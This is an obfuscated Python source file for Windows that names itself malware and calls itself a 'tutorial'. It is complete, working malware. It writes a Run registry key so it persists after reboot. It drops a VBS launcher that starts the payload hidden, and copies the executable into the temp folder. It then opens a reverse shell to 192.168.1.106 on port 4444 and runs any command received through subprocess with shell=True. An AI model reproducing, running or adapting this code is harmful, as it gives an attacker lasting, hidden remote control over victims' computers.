import os 	
import subprocess 	
import socket 	
import sys 	
import tempfile 	
from _winreg import *	
MALWARE_NAME ="malware.exe"	
TRIGGER =MALWARE_NAME .replace ('.exe','')+".vbs"	
KEY_PATH ="Software\Microsoft\Windows\CurrentVersion\Run"	
KEY_NAME ="anarc0der_key"	
REV_SHELL ="192.168.1.106"	
SHELL_PORT =4444 	
TRIGGER_PATH =tempfile .gettempdir ()+"\\"+TRIGGER 	
MALWARE_PATH =tempfile .gettempdir ()+"\\"+MALWARE_NAME 	
class My_malware ():	
    def infect_windows_register_keys (O0OOOOOOO0OO00OO0 ):	
        ""	
        OOOOOOO0OO0O0OOOO =OpenKey (HKEY_LOCAL_MACHINE ,KEY_PATH )	
        O0O0000O0OOOO00OO =[]	
        try :	
            O0O0O0OOOOOO0OOO0 =0 	
            while True :	
                OOO0O0OO0O0O0O000 =EnumValue (OOOOOOO0OO0O0OOOO ,O0O0O0OOOOOO0OOO0 )	
                O0O0000O0OOOO00OO .append (OOO0O0OO0O0O0O000 [0 ])	
                O0O0O0OOOOOO0OOO0 +=1 	
        except :	
            pass 	
        if KEY_NAME not in O0O0000O0OOOO00OO :	
            O0O0OOO00O0OO0OOO =OpenKey (HKEY_LOCAL_MACHINE ,KEY_PATH ,0 ,KEY_ALL_ACCESS )	
            SetValueEx (O0O0OOO00O0OO0OOO ,KEY_NAME ,0 ,REG_SZ ,TRIGGER_PATH )	
            O0O0OOO00O0OO0OOO .Close ()	
            return False 	
        return True 	
    def hide_malware_and_trigger (O00OO00O000O0O0O0 ):	
        ""	
        if os .path .exists (MALWARE_PATH )and os .path .exists (TRIGGER_PATH ):	
            return True 	
        else :	
            OOOOOO0O0O0OO0OO0 ='Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run """{0}""", 0 , false'.format (MALWARE_PATH )	
            with open (TRIGGER_PATH ,'w')as OOOOO0OOO0OO0000O :	
                OOOOO0OOO0OO0000O .write (OOOOOO0O0O0OO0OO0 )	
            os .system ('copy %s %s'%(MALWARE_NAME ,MALWARE_PATH ))	
            return False 	
    def reverse_shell_function (OOO00OO00000O0OO0 ):	
        ""	
        O0O0O0O0OOO0000OO =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )	
        O0O0O0O0OOO0000OO .connect ((REV_SHELL ,SHELL_PORT ))	
        O0O0O0O0OOO0000OO .send ('\n\!/ anarc0der mlwr tutorial\n\n[*] If you need to finish, just type: quit\n[*] PRESS ENTER TO PROMPT\n\n')	
        while True :	
            OOOO0000O00O00O0O =O0O0O0O0OOO0000OO .recv (1024 )	
            if "quit"in OOOO0000O00O00O0O :	
                break 	
            O0O000O0OOOO0O000 =subprocess .Popen (OOOO0000O00O00O0O ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )	
            OOOOOOO00OOOOOO0O =O0O000O0OOOO0O000 .stdout .read ()+O0O000O0OOOO0O000 .stderr .read ()	
            O0O0O0O0OOO0000OO .send (OOOOOOO00OOOOOO0O )	
            O0O0O0O0OOO0000OO .send ("Comando: ")	
        O0O0O0O0OOO0000OO .close ()	
def main ():	
    OOO000OO0OO00OOOO =[]	
    O0O0000O000O00O0O =My_malware ()	
    OOO000OO0OO00OOOO .append (O0O0000O000O00O0O .infect_windows_register_keys ())	
    OOO000OO0OO00OOOO .append (O0O0000O000O00O0O .hide_malware_and_trigger ())	
    if all (O0OO0OO0O0000OOO0 is True for O0OO0OO0O0000OOO0 in OOO000OO0OO00OOOO ):	
        O0O0000O000O00O0O .reverse_shell_function ()	
if __name__ =='__main__':	
    main ()